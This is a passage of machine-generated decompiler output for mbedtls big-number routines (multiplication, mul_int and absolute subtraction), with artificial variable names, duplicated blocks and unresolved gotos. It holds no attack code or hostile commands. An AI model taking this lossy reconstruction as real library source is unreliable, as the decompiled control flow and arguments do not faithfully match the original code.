                                                                    v34 = v144;
                                                                    v14 = v13;
                                                                    v35 = v143;
                                                                    v33 = v32 % 16;
                                                                    // branch -> 0x8057c8d
                                                                }
                                                              lab_0x8057c8d_7:;
                                                                int32_t v145 = v34; // 0x8057d80163
                                                                int32_t v146 = v14;
                                                                int32_t v147 = v35; // 0x8057daa151
                                                                int32_t v148 = v33; // 0x8057d52145
                                                                if (v33 >= 8) {
                                                                    int32_t v149 = v34; // 0x8057d80166
                                                                    int32_t v150 = v14;
                                                                    int32_t v151 = v33 - 8; // 0x8057ca0
                                                                    v44 = v38;
                                                                    uint64_t v152 = (int64_t)*(int32_t *)v149 * (int64_t)v38; // 0x8057cb3
                                                                    uint32_t v153 = (int32_t)v152; // 0x8057cb3
                                                                    uint32_t v154 = v153 + v35; // 0x8057cb5
                                                                    int32_t * v155 = (int32_t *)v150; // 0x8057cba_0
                                                                    uint32_t v156 = v154 + *v155; // 0x8057cba
                                                                    *v155 = v156;
                                                                    int32_t v157 = *(int32_t *)(v149 + 4); // 0x8057cc2
                                                                    uint64_t v158 = (int64_t)v44 * (int64_t)v157; // 0x8057cc3
                                                                    uint32_t v159 = (int32_t)v158; // 0x8057cc3
                                                                    uint32_t v160 = (int32_t)(v156 < v154) + (int32_t)(v154 < v153) + (int32_t)(v152 / 0x100000000) + v159; // 0x8057cc5
                                                                    int32_t * v161 = (int32_t *)(v150 + 4); // 0x8057cca_0
                                                                    uint32_t v162 = v160 + *v161; // 0x8057cca
                                                                    *v161 = v162;
                                                                    int32_t v163 = *(int32_t *)(v149 + 8); // 0x8057cd2
                                                                    uint64_t v164 = (int64_t)v44 * (int64_t)v163; // 0x8057cd3
                                                                    uint32_t v165 = (int32_t)v164; // 0x8057cd3
                                                                    uint32_t v166 = (int32_t)(v162 < v160) + (int32_t)(v160 < v159) + (int32_t)(v158 / 0x100000000) + v165; // 0x8057cd5
                                                                    int32_t * v167 = (int32_t *)(v150 + 8); // 0x8057cda_0
                                                                    uint32_t v168 = v166 + *v167; // 0x8057cda
                                                                    *v167 = v168;
                                                                    int32_t v169 = *(int32_t *)(v149 + 12); // 0x8057ce2
                                                                    uint64_t v170 = (int64_t)v44 * (int64_t)v169; // 0x8057ce3
                                                                    uint32_t v171 = (int32_t)v170; // 0x8057ce3
                                                                    uint32_t v172 = (int32_t)(v168 < v166) + (int32_t)(v166 < v165) + (int32_t)(v164 / 0x100000000) + v171; // 0x8057ce5
                                                                    int32_t * v173 = (int32_t *)(v150 + 12); // 0x8057cea_0
                                                                    uint32_t v174 = v172 + *v173; // 0x8057cea
                                                                    *v173 = v174;
                                                                    int32_t v175 = *(int32_t *)(v149 + 16); // 0x8057cf2
                                                                    uint64_t v176 = (int64_t)v44 * (int64_t)v175; // 0x8057cf3
                                                                    uint32_t v177 = (int32_t)v176; // 0x8057cf3
                                                                    uint32_t v178 = (int32_t)(v174 < v172) + (int32_t)(v172 < v171) + (int32_t)(v170 / 0x100000000) + v177; // 0x8057cf5
                                                                    int32_t * v179 = (int32_t *)(v150 + 16); // 0x8057cfa_0
                                                                    uint32_t v180 = v178 + *v179; // 0x8057cfa
                                                                    *v179 = v180;
                                                                    int32_t v181 = *(int32_t *)(v149 + 20); // 0x8057d02
                                                                    uint64_t v182 = (int64_t)v44 * (int64_t)v181; // 0x8057d03
                                                                    uint32_t v183 = (int32_t)v182; // 0x8057d03
                                                                    uint32_t v184 = (int32_t)(v180 < v178) + (int32_t)(v178 < v177) + (int32_t)(v176 / 0x100000000) + v183; // 0x8057d05
                                                                    int32_t * v185 = (int32_t *)(v150 + 20); // 0x8057d0a_0
                                                                    uint32_t v186 = v184 + *v185; // 0x8057d0a
                                                                    *v185 = v186;
                                                                    int32_t v187 = *(int32_t *)(v149 + 24); // 0x8057d12
                                                                    uint64_t v188 = (int64_t)v44 * (int64_t)v187; // 0x8057d13
                                                                    uint32_t v189 = (int32_t)v188; // 0x8057d13
                                                                    uint32_t v190 = (int32_t)(v186 < v184) + (int32_t)(v184 < v183) + (int32_t)(v182 / 0x100000000) + v189; // 0x8057d15
                                                                    int32_t * v191 = (int32_t *)(v150 + 24); // 0x8057d1a_0
                                                                    uint32_t v192 = v190 + *v191; // 0x8057d1a
                                                                    *v191 = v192;
                                                                    int32_t v193 = *(int32_t *)(v149 + 28); // 0x8057d22
                                                                    uint64_t v194 = (int64_t)v44 * (int64_t)v193; // 0x8057d23
                                                                    uint32_t v195 = (int32_t)v194; // 0x8057d23
                                                                    uint32_t v196 = (int32_t)(v192 < v190) + (int32_t)(v190 < v189) + (int32_t)(v188 / 0x100000000) + v195; // 0x8057d25
                                                                    int32_t * v197 = (int32_t *)(v150 + 28); // 0x8057d2a_0
                                                                    uint32_t v198 = v196 + *v197; // 0x8057d2a
                                                                    int32_t v199 = (int32_t)(v198 < v196) + (int32_t)(v196 < v195) + (int32_t)(v194 / 0x100000000); // 0x8057d2c
                                                                    g4 = v199;
                                                                    *v197 = v198;
                                                                    int32_t v200 = v149 + 32; // 0x8057d3b
                                                                    // branch -> 0x8057ca0
                                                                    while (v151 > 7) {
                                                                        // 0x8057ca0
                                                                        v149 = v200;
                                                                        v150 += 32;
                                                                        v151 -= 8;
                                                                        v44 = v38;
                                                                        v152 = (int64_t)*(int32_t *)v149 * (int64_t)v38;
                                                                        v153 = (int32_t)v152;
                                                                        v154 = v153 + v199;
                                                                        v155 = (int32_t *)v150;
                                                                        v156 = v154 + *v155;
                                                                        *v155 = v156;
                                                                        v157 = *(int32_t *)(v149 + 4);
                                                                        v158 = (int64_t)v44 * (int64_t)v157;
                                                                        v159 = (int32_t)v158;
                                                                        v160 = (int32_t)(v156 < v154) + (int32_t)(v154 < v153) + (int32_t)(v152 / 0x100000000) + v159;
                                                                        v161 = (int32_t *)(v150 + 4);
                                                                        v162 = v160 + *v161;
                                                                        *v161 = v162;
                                                                        v163 = *(int32_t *)(v149 + 8);
                                                                        v164 = (int64_t)v44 * (int64_t)v163;
                                                                        v165 = (int32_t)v164;
                                                                        v166 = (int32_t)(v162 < v160) + (int32_t)(v160 < v159) + (int32_t)(v158 / 0x100000000) + v165;
                                                                        v167 = (int32_t *)(v150 + 8);
                                                                        v168 = v166 + *v167;
                                                                        *v167 = v168;
                                                                        v169 = *(int32_t *)(v149 + 12);
                                                                        v170 = (int64_t)v44 * (int64_t)v169;
                                                                        v171 = (int32_t)v170;
                                                                        v172 = (int32_t)(v168 < v166) + (int32_t)(v166 < v165) + (int32_t)(v164 / 0x100000000) + v171;
                                                                        v173 = (int32_t *)(v150 + 12);
                                                                        v174 = v172 + *v173;
                                                                        *v173 = v174;
                                                                        v175 = *(int32_t *)(v149 + 16);
                                                                        v176 = (int64_t)v44 * (int64_t)v175;
                                                                        v177 = (int32_t)v176;
                                                                        v178 = (int32_t)(v174 < v172) + (int32_t)(v172 < v171) + (int32_t)(v170 / 0x100000000) + v177;
                                                                        v179 = (int32_t *)(v150 + 16);
                                                                        v180 = v178 + *v179;
                                                                        *v179 = v180;
                                                                        v181 = *(int32_t *)(v149 + 20);
                                                                        v182 = (int64_t)v44 * (int64_t)v181;
                                                                        v183 = (int32_t)v182;
                                                                        v184 = (int32_t)(v180 < v178) + (int32_t)(v178 < v177) + (int32_t)(v176 / 0x100000000) + v183;
                                                                        v185 = (int32_t *)(v150 + 20);
                                                                        v186 = v184 + *v185;
                                                                        *v185 = v186;
                                                                        v187 = *(int32_t *)(v149 + 24);
                                                                        v188 = (int64_t)v44 * (int64_t)v187;
                                                                        v189 = (int32_t)v188;
                                                                        v190 = (int32_t)(v186 < v184) + (int32_t)(v184 < v183) + (int32_t)(v182 / 0x100000000) + v189;
                                                                        v191 = (int32_t *)(v150 + 24);
                                                                        v192 = v190 + *v191;
                                                                        *v191 = v192;
                                                                        v193 = *(int32_t *)(v149 + 28);
                                                                        v194 = (int64_t)v44 * (int64_t)v193;
                                                                        v195 = (int32_t)v194;
                                                                        v196 = (int32_t)(v192 < v190) + (int32_t)(v190 < v189) + (int32_t)(v188 / 0x100000000) + v195;
                                                                        v197 = (int32_t *)(v150 + 28);
                                                                        v198 = v196 + *v197;
                                                                        v199 = (int32_t)(v198 < v196) + (int32_t)(v196 < v195) + (int32_t)(v194 / 0x100000000);
                                                                        g4 = v199;
                                                                        *v197 = v198;
                                                                        v200 = v149 + 32;
                                                                        // continue -> 0x8057ca0
                                                                    }
                                                                    // 0x8057d47
                                                                    v145 = v200;
                                                                    v146 = v14 + 32 + 32 * (v33 - 8) / 8;
                                                                    v147 = v199;
                                                                    v148 = v33 % 8;
                                                                    // branch -> 0x8057d4b
                                                                }
                                                                int32_t v201 = v146;
                                                                if (v148 != 0) {
                                                                    int32_t v202 = v148; // 0x8057d58
                                                                    int32_t v203 = v146;
                                                                    uint64_t v204 = (int64_t)*(int32_t *)v145 * (int64_t)v38; // 0x8057d68
                                                                    uint32_t v205 = (int32_t)v204; // 0x8057d68
                                                                    uint32_t v206 = v205 + v147; // 0x8057d6a
                                                                    int32_t * v207 = (int32_t *)v203; // 0x8057d6f_0
                                                                    uint32_t v208 = v206 + *v207; // 0x8057d6f
                                                                    int32_t v209 = (int32_t)(v208 < v206) + (int32_t)(v206 < v205) + (int32_t)(v204 / 0x100000000); // 0x8057d71
                                                                    g4 = v209;
                                                                    *v207 = v208;
                                                                    // branch -> 0x8057d58
                                                                    while (v202 != 1) {
                                                                        // 0x8057d58
                                                                        v202--;
                                                                        v145 += 4;
                                                                        v203 += 4;
                                                                        v204 = (int64_t)*(int32_t *)v145 * (int64_t)v38;
                                                                        v205 = (int32_t)v204;
                                                                        v206 = v205 + v209;
                                                                        v207 = (int32_t *)v203;
                                                                        v208 = v206 + *v207;
                                                                        v209 = (int32_t)(v208 < v206) + (int32_t)(v206 < v205) + (int32_t)(v204 / 0x100000000);
                                                                        g4 = v209;
                                                                        *v207 = v208;
                                                                        // continue -> 0x8057d58
                                                                    }
                                                                    // 0x8057d88
                                                                    v201 = v146 + 4 * v148;
                                                                    v147 = v209;
                                                                    // branch -> 0x8057d88
                                                                }
                                                                int32_t * v210 = (int32_t *)v201; // 0x8057d98_0
                                                                int32_t v211 = *v210 + v147; // 0x8057d98
                                                                *v210 = v211;
                                                                // branch -> 0x8057d98
                                                                while (v211 < v147) {
                                                                    // 0x8057d98
                                                                    v201 += 4;
                                                                    v147 = v211 < v147;
                                                                    v210 = (int32_t *)v201;
                                                                    v211 = *v210 + v147;
                                                                    *v210 = v211;
                                                                    // continue -> 0x8057d98
                                                                }
                                                                // 0x8057daf
                                                                g3 = v16;
                                                                if (v16 == 0) {
                                                                    // 0x8057dca
                                                                    // branch -> 0x8057dca
                                                                    // 0x8057dca
                                                                    *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                                                                    // branch -> 0x8057aad
                                                                    // 0x8057aad
                                                                    g1 = v9;
                                                                    g1 = mbedtls_mpi_free((int32_t *)v9);
                                                                    g6 = &v6;
                                                                    mbedtls_mpi_free(&v6);
                                                                    g3 = v5;
                                                                    g7 = v4;
                                                                    g5 = v3;
                                                                    return 0;
                                                                }
                                                                // 0x8057dbd
                                                                v13 -= 4;
                                                                v43 = v16;
                                                                v16--;
                                                                v17 -= 4;
                                                                // branch -> 0x8057b28
                                                            }
                                                        }
                                                        // 0x8057dca
                                                        *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                                                        // branch -> 0x8057aad
                                                        // 0x8057aad
                                                        g1 = v9;
                                                        g1 = mbedtls_mpi_free((int32_t *)v9);
                                                        g6 = &v6;
                                                        mbedtls_mpi_free(&v6);
                                                        g3 = v5;
                                                        g7 = v4;
                                                        g5 = v3;
                                                        return 0;
                                                    }
                                                    result = v11;
                                                }
                                                // 0x8057aad
                                                g1 = v9;
                                                g1 = mbedtls_mpi_free((int32_t *)v9);
                                                g6 = &v6;
                                                mbedtls_mpi_free(&v6);
                                                g3 = v5;
                                                g7 = v4;
                                                g5 = v3;
                                                return result;
                                            }
                                        } else {
                                            v18 = 0;
                                        }
                                    } else {
                                        v18 = v27;
                                    }
                                }
                                // 0x8057a91
                                v10 = mbedtls_mpi_grow(v1, (char *)(v18 + v32));
                                result = v10;
                                if (v10 == 0) {
                                    // 0x8057ad0
                                    v11 = mbedtls_mpi_lset((char *)v1, 0);
                                    if (v11 == 0) {
                                        // 0x8057aea
                                        v15 = g3;
                                        if (v15 != 0) {
                                            // 0x8057af2
                                            v30 = *(int32_t *)(v8 + 8);
                                            v23 = v15 - 1;
                                            v31 = *(int32_t *)(v1 + 8);
                                            v39 = *(int32_t *)(v20 + 8) - 4;
                                            v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                                            v16 = v23;
                                            v17 = v31 + 4 * v23;
                                            // branch -> 0x8057b28
                                            while (true) {
                                                // 0x8057b28
                                                v38 = *(int32_t *)(v39 + 4 * v15);
                                                if (v32 < 16) {
                                                    v34 = v30;
                                                    v14 = v17;
                                                    v35 = 0;
                                                    v33 = v32;
                                                    goto lab_0x8057c8d_7;
                                                }
                                                goto lab_0x8057b60_7;
                                            }
                                        }
                                        // 0x8057dca
                                        *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                                        // branch -> 0x8057aad
                                        // 0x8057aad
                                        g1 = v9;
                                        g1 = mbedtls_mpi_free((int32_t *)v9);
                                        g6 = &v6;
                                        mbedtls_mpi_free(&v6);
                                        g3 = v5;
                                        g7 = v4;
                                        g5 = v3;
                                        return 0;
                                    }
                                    result = v11;
                                }
                                // 0x8057aad
                                g1 = v9;
                                g1 = mbedtls_mpi_free((int32_t *)v9);
                                g6 = &v6;
                                mbedtls_mpi_free(&v6);
                                g3 = v5;
                                g7 = v4;
                                g5 = v3;
                                return result;
                            }
                        } else {
                            v32 = 0;
                        }
                    } else {
                        v32 = v24;
                    }
                }
                // 0x8057a5c
                v27 = *(int32_t *)(v20 + 4);
                g3 = v27;
                v18 = 0;
                if (v27 != 0) {
                    // 0x8057a66
                    v28 = *(int32_t *)(v20 + 8);
                    v22 = v27 - 1;
                    v29 = *(int32_t *)(v28 + 4 * v22);
                    g5 = v29;
                    if (v29 == 0) {
                        // 0x8057a8b
                        g3 = v22;
                        if (v22 != 0) {
                            // 0x8057a80
                            v21 = v22;
                            // branch -> 0x8057a80
                            while (true) {
                                // 0x8057a80
                                v37 = *(int32_t *)(v28 - 4 + 4 * v21);
                                g7 = v37;
                                if (v37 == 0) {
                                    goto lab_0x8057a88_5;
                                }
                                // 0x8057a80
                                // branch -> 0x8057a91
                            }
                        } else {
                            v18 = 0;
                        }
                    } else {
                        v18 = v27;
                    }
                }
                // 0x8057a91
                v10 = mbedtls_mpi_grow(v1, (char *)(v18 + v32));
                if (v10 == 0) {
                    // 0x8057ad0
                    v11 = mbedtls_mpi_lset((char *)v1, 0);
                    if (v11 == 0) {
                        // 0x8057aea
                        v15 = g3;
                        if (v15 != 0) {
                            // 0x8057af2
                            v30 = *(int32_t *)(v8 + 8);
                            v23 = v15 - 1;
                            v31 = *(int32_t *)(v1 + 8);
                            v39 = *(int32_t *)(v20 + 8) - 4;
                            v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                            v16 = v23;
                            v17 = v31 + 4 * v23;
                            // branch -> 0x8057b28
                            while (true) {
                                // 0x8057b28
                                v38 = *(int32_t *)(v39 + 4 * v15);
                                if (v32 < 16) {
                                    v34 = v30;
                                    v14 = v17;
                                    v35 = 0;
                                    v33 = v32;
                                    goto lab_0x8057c8d_7;
                                }
                                goto lab_0x8057b60_7;
                            }
                        }
                        // 0x8057dca
                        *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                        result = 0;
                        // branch -> 0x8057aad
                    } else {
                        result = v11;
                    }
                } else {
                    result = v10;
                }
            }
            // 0x8057aad
            g1 = v9;
            g1 = mbedtls_mpi_free((int32_t *)v9);
            g6 = &v6;
            mbedtls_mpi_free(&v6);
            g3 = v5;
            g7 = v4;
            g5 = v3;
            return result;
        }
        // 0x8057a21
        v24 = *(int32_t *)(v8 + 4);
        v32 = 0;
        if (v24 != 0) {
            // 0x8057a2e
            v25 = *(int32_t *)(v8 + 8);
            v36 = v24 - 1;
            v26 = *(int32_t *)(v25 + 4 * v36);
            g7 = v26;
            if (v26 == 0) {
                // 0x8057a53
                g4 = v36;
                if (v36 != 0) {
                    // 0x8057a48
                    v19 = v36;
                    // branch -> 0x8057a48
                    while (true) {
                        // 0x8057a48
                        if (*(int32_t *)(v25 - 4 + 4 * v19) == 0) {
                            goto lab_0x8057a50_3;
                        }
                        // 0x8057a48
                        // branch -> 0x8057a5c
                    }
                } else {
                    v32 = 0;
                }
            } else {
                v32 = v24;
            }
        }
        // 0x8057a5c
        v27 = *(int32_t *)(v20 + 4);
        g3 = v27;
        v18 = 0;
        if (v27 != 0) {
            // 0x8057a66
            v28 = *(int32_t *)(v20 + 8);
            v22 = v27 - 1;
            v29 = *(int32_t *)(v28 + 4 * v22);
            g5 = v29;
            if (v29 == 0) {
                // 0x8057a8b
                g3 = v22;
                if (v22 != 0) {
                    // 0x8057a80
                    v21 = v22;
                    // branch -> 0x8057a80
                    while (true) {
                        // 0x8057a80
                        v37 = *(int32_t *)(v28 - 4 + 4 * v21);
                        g7 = v37;
                        if (v37 == 0) {
                            goto lab_0x8057a88_5;
                        }
                        // 0x8057a80
                        // branch -> 0x8057a91
                    }
                } else {
                    v18 = 0;
                }
            } else {
                v18 = v27;
            }
        }
        // 0x8057a91
        v10 = mbedtls_mpi_grow(v1, (char *)(v18 + v32));
        if (v10 == 0) {
            // 0x8057ad0
            v11 = mbedtls_mpi_lset((char *)v1, 0);
            if (v11 == 0) {
                // 0x8057aea
                v15 = g3;
                if (v15 != 0) {
                    // 0x8057af2
                    v30 = *(int32_t *)(v8 + 8);
                    v23 = v15 - 1;
                    v31 = *(int32_t *)(v1 + 8);
                    v39 = *(int32_t *)(v20 + 8) - 4;
                    v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                    v16 = v23;
                    v17 = v31 + 4 * v23;
                    // branch -> 0x8057b28
                    while (true) {
                        // 0x8057b28
                        v38 = *(int32_t *)(v39 + 4 * v15);
                        if (v32 < 16) {
                            v34 = v30;
                            v14 = v17;
                            v35 = 0;
                            v33 = v32;
                            goto lab_0x8057c8d_7;
                        }
                        goto lab_0x8057b60_7;
                    }
                }
                // 0x8057dca
                *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                result = 0;
                // branch -> 0x8057aad
            } else {
                result = v11;
            }
        } else {
            result = v10;
        }
    }
    // 0x8057aad
    g1 = v9;
    g1 = mbedtls_mpi_free((int32_t *)v9);
    g6 = &v6;
    mbedtls_mpi_free(&v6);
    g3 = v5;
    g7 = v4;
    g5 = v3;
    return result;
}

// Address range: 0x8057e40 - 0x8057e7f
int32_t mbedtls_mpi_mul_int(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = 1; // bp-28
    int32_t result = mbedtls_mpi_mul_mpi((int32_t *)a1, (int32_t *)a2, &v1); // 0x8057e74
    g1 = result;
    int32_t v2;
    g2 = v2;
    return result;
}

// Address range: 0x8057e80 - 0x8057fcf
int32_t mbedtls_mpi_sub_abs(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g5; // 0x8057e83
    int32_t v2 = g7; // 0x8057e84
    int32_t v3 = g3; // 0x8057e85
    g7 = a2;
    g5 = a3;
    g3 = (int32_t)a1;
    int32_t v4 = mbedtls_mpi_cmp_abs(a2, a3); // 0x8057e99
    g6 = v4;
    g1 = -10;
    if (v4 < 0) {
        // 0x8057eeb
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return -10;
    }
    int32_t v5 = g3; // 0x8057ea9
    int32_t v6 = g5; // 0x8057ea9
    int32_t v7 = 1;
    int32_t v8 = v5; // 0x8057ece
    int32_t v9; // 0x8057f72
    int32_t v10; // 0x8057f97
    int32_t v11; // 0x8057f9760
    int32_t * v12; // 0x8057f5f_0
    int32_t * v13; // 0x8057f8a_0
    int32_t * v14; // bp+054
    int32_t v15; // 0x8057ed1
    int32_t v16; // eax
    int32_t v17; // edi
    uint32_t v18;
    int32_t * v19;
    int32_t v20; // 0x8057f50
    int32_t v21; // 0x8057f93
    int32_t v22; // 0x8057f9358
    int32_t v23; // 0x8057f65
    int32_t v24; // 0x8057f01
    int32_t v25; // 0x8057f9a
    int32_t v26; // 0x8057f9a61
    int32_t v27; // 0x8057f9a64
    int32_t v28; // 0x8057ec6
    uint32_t v29; // 0x8057f8a
    uint32_t v30; // 0x8057f8a55
    int32_t v31; // 0x8057f20
    int32_t v32; // 0x8057f68
    int32_t v33; // 0x8057f08
    int32_t v34; // 0x8057f5f
    int32_t result; // 0x8057edd
    int32_t v35; // 0x8057f05
    int32_t v36; // 0x8057f0b
    int32_t v37; // 0x8057f30
    uint32_t v38; // 0x8057f5f
    int32_t v39; // 0x8057f7a26
    uint32_t v40; // 0x8057f5f
    if (v5 != v6) {
        // 0x8057ec6
        v28 = g7;
        if (v8 == v28) {
            // 0x8057ef8
            *(int32_t *)v8 = 1;
            v24 = *(int32_t *)(v6 + 4);
            if (v24 != 0) {
                // 0x8057f05
                v35 = *(int32_t *)(g5 + 8);
                v17 = v35;
                v33 = v24 - 1;
                v36 = *(int32_t *)(v35 + 4 * v33);
                g4 = v36;
                if (v36 == 0) {
                    // 0x8057f23
                    if (v33 != 0) {
                        // 0x8057f18
                        v31 = v33;
                        // branch -> 0x8057f18
                        while (true) {
                            // 0x8057f18
                            if (*(int32_t *)(v35 - 4 + 4 * v31) == 0) {
                                goto lab_0x8057f20_3;
                            }
                            // 0x8057f30
                            // branch -> 0x8057f30
                            // 0x8057f30
                            v37 = *(int32_t *)(g3 + 8);
                            v16 = v37;
                            g4 = 0;
                            v39 = 0;
                            v19 = (int32_t *)v37;
                            v18 = *v19;
                            v20 = v18 - v39;
                            *v19 = v20;
                            v34 = g4;
                            v38 = v20;
                            v12 = (int32_t *)(4 * v34 + v17);
                            v40 = *v12;
                            v23 = v38 - *v12;
                            g3 = v23;
                            v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                            g4 = v34 + 1;
                            *(int32_t *)v16 = v23;
                            v9 = v16 + 4;
                            v16 = v9;
                            // branch -> 0x8057f4a
                            while (v31 > g4) {
                                // 0x8057f4a
                                v39 = v32;
                                v19 = (int32_t *)v9;
                                v18 = *v19;
                                v20 = v18 - v39;
                                *v19 = v20;
                                v34 = g4;
                                v38 = v20;
                                v12 = (int32_t *)(4 * v34 + v17);
                                v40 = *v12;
                                v23 = v38 - *v12;
                                g3 = v23;
                                v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                                g4 = v34 + 1;
                                *(int32_t *)v16 = v23;
                                v9 = v16 + 4;
                                v16 = v9;
                                // continue -> 0x8057f4a
                            }
                            // 0x8057f7a
                            if (v32 != 0) {
                                // 0x8057f8a
                                v14 = (int32_t *)v9;
                                v30 = *v14;
                                g3 = v30 < v32;
                                v22 = v30 - v32;
                                g4 = v22;
                                *v14 = v22;
                                v11 = v16 + 4;
                                v26 = g3;
                                if (v26 == 0) {
                                    // 0x8057f9e
                                    g1 = 0;
                                    // branch -> 0x8057eda
                                    // 0x8057eda
                                    g6 = &v7;
                                    mbedtls_mpi_free(&v7);
                                    // branch -> 0x8057eeb
                                    // 0x8057eeb
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return 0;
                                }
                                v27 = v26;
                                v13 = (int32_t *)v11;
                                v29 = *v13;
                                g3 = v29 < v27;
                                v21 = v29 - v27;
                                g4 = v21;
                                *v13 = v21;
                                v10 = v11 + 4;
                                v25 = g3;
                                while (v25 != 0) {
                                    // 0x8057f88
                                    v27 = v25;
                                    v13 = (int32_t *)v10;
                                    v29 = *v13;
                                    g3 = v29 < v27;
                                    v21 = v29 - v27;
                                    g4 = v21;
                                    *v13 = v21;
                                    v10 += 4;
                                    v25 = g3;
                                    // continue -> 0x8057f88
                                }
                                // 0x8057f9e
                                g1 = 0;
                                // branch -> 0x8057eda
                                // 0x8057eda
                                g6 = &v7;
                                mbedtls_mpi_free(&v7);
                                // branch -> 0x8057eeb
                                // 0x8057eeb
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return 0;
                            }
                        }
                    }
                } else {
                    // 0x8057f30
                    v37 = *(int32_t *)(g3 + 8);
                    v16 = v37;
                    g4 = 0;
                    v39 = 0;
                    v19 = (int32_t *)v37;
                    v18 = *v19;
                    v20 = v18 - v39;
                    *v19 = v20;
                    v34 = g4;
                    v38 = v20;
                    v12 = (int32_t *)(4 * v34 + v17);
                    v40 = *v12;
                    v23 = v38 - *v12;
                    g3 = v23;
                    v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                    g4 = v34 + 1;
                    *(int32_t *)v16 = v23;
                    v9 = v16 + 4;
                    v16 = v9;
                    // branch -> 0x8057f4a
                    while (v24 > g4) {
                        // 0x8057f4a
                        v39 = v32;
                        v19 = (int32_t *)v9;
                        v18 = *v19;
                        v20 = v18 - v39;
                        *v19 = v20;
                        v34 = g4;
                        v38 = v20;
                        v12 = (int32_t *)(4 * v34 + v17);
                        v40 = *v12;
                        v23 = v38 - *v12;
                        g3 = v23;
                        v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                        g4 = v34 + 1;
                        *(int32_t *)v16 = v23;
                        v9 = v16 + 4;
                        v16 = v9;
                        // continue -> 0x8057f4a
                    }
                    // 0x8057f7a
                    if (v32 != 0) {
                        // 0x8057f8a
                        v14 = (int32_t *)v9;
                        v30 = *v14;
                        g3 = v30 < v32;
                        v22 = v30 - v32;
                        g4 = v22;
                        *v14 = v22;
                        v11 = v16 + 4;
                        v26 = g3;
                        if (v26 == 0) {
                            // 0x8057f9e
                            g1 = 0;
                            // branch -> 0x8057eda
                            // 0x8057eda
                            g6 = &v7;
                            mbedtls_mpi_free(&v7);
                            // branch -> 0x8057eeb
                            // 0x8057eeb
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return 0;
                        }
                        v27 = v26;
                        v13 = (int32_t *)v11;
                        v29 = *v13;
                        g3 = v29 < v27;
                        v21 = v29 - v27;
                        g4 = v21;
                        *v13 = v21;
                        v10 = v11 + 4;
                        v25 = g3;
                        while (v25 != 0) {
                            // 0x8057f88
                            v27 = v25;
                            v13 = (int32_t *)v10;
                            v29 = *v13;
                            g3 = v29 < v27;
                            v21 = v29 - v27;
                            g4 = v21;
                            *v13 = v21;
                            v10 += 4;
                            v25 = g3;
                            // continue -> 0x8057f88
                        }
                        // 0x8057f9e
                        g1 = 0;
                        // branch -> 0x8057eda
                        // 0x8057eda
                        g6 = &v7;
                        mbedtls_mpi_free(&v7);
                        // branch -> 0x8057eeb
                        // 0x8057eeb
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        return 0;
                    }
                }
                // 0x8057f29
                g1 = 0;
                // branch -> 0x8057eda
                // 0x8057eda
                g6 = &v7;
                mbedtls_mpi_free(&v7);
                // branch -> 0x8057eeb
                // 0x8057eeb
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
            // 0x8057f29
            g1 = 0;
            result = 0;
            // branch -> 0x8057eda
        } else {
            // 0x8057eca
            v15 = mbedtls_mpi_copy((char *)v8, (int32_t *)v28);
            g1 = v15;
            if (v15 == 0) {
                // 0x8057eca
                // branch -> 0x8057ef8
                // 0x8057ef8
                *(int32_t *)g3 = 1;
                v24 = *(int32_t *)(g5 + 4);
                if (v24 != 0) {
                    // 0x8057f05
                    v35 = *(int32_t *)(g5 + 8);
                    v17 = v35;
                    v33 = v24 - 1;
                    v36 = *(int32_t *)(v35 + 4 * v33);
                    g4 = v36;
                    if (v36 == 0) {
                        // 0x8057f23
                        if (v33 != 0) {
                            // 0x8057f18
                            v31 = v33;
                            // branch -> 0x8057f18
                            while (true) {
                                // 0x8057f18
                                if (*(int32_t *)(v35 - 4 + 4 * v31) == 0) {
                                    goto lab_0x8057f20_3;
                                }
                                // 0x8057f30
                                // branch -> 0x8057f30
                                // 0x8057f30
                                v37 = *(int32_t *)(g3 + 8);
                                v16 = v37;
                                g4 = 0;
                                v39 = 0;
                                v19 = (int32_t *)v37;
                                v18 = *v19;
                                v20 = v18 - v39;
                                *v19 = v20;
                                v34 = g4;
                                v38 = v20;
                                v12 = (int32_t *)(4 * v34 + v17);
                                v40 = *v12;
                                v23 = v38 - *v12;
                                g3 = v23;
                                v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                                g4 = v34 + 1;
                                *(int32_t *)v16 = v23;
                                v9 = v16 + 4;
                                v16 = v9;
                                // branch -> 0x8057f4a
                                while (v31 > g4) {
                                    // 0x8057f4a
                                    v39 = v32;
                                    v19 = (int32_t *)v9;
                                    v18 = *v19;
                                    v20 = v18 - v39;
                                    *v19 = v20;
                                    v34 = g4;
                                    v38 = v20;
                                    v12 = (int32_t *)(4 * v34 + v17);
                                    v40 = *v12;
                                    v23 = v38 - *v12;
                                    g3 = v23;
                                    v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                                    g4 = v34 + 1;
                                    *(int32_t *)v16 = v23;
                                    v9 = v16 + 4;
                                    v16 = v9;
                                    // continue -> 0x8057f4a
                                }
                                // 0x8057f7a
                                if (v32 != 0) {
                                    // 0x8057f8a
                                    v14 = (int32_t *)v9;
                                    v30 = *v14;
                                    g3 = v30 < v32;
                                    v22 = v30 - v32;
                                    g4 = v22;
                                    *v14 = v22;
                                    v11 = v16 + 4;
                                    v26 = g3;
                                    if (v26 == 0) {
                                        // 0x8057f9e
                                        g1 = 0;
                                        // branch -> 0x8057eda
                                        // 0x8057eda
                                        g6 = &v7;
